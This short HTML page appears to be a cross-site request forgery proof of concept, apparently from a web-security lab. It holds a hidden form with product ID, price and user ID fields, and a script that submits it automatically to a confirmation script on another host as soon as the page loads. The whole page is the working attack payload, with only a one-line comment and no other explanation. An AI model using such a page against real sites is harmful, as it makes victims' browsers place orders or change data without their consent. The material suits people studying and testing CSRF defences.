<!DOCTYPE html>
<html>
<body>
<!-- sends to another host -->
<form method="post" action="http://anotherhost:8787/comfirm.php">
	<input type="hidden" name="product_id" value="4">
	<input type="hidden" name="product_price" value="20">
	<input type="hidden" name="user_id" value="1">
</form>
<script>
	document.forms[0].submit();
</script>
</body>
</html>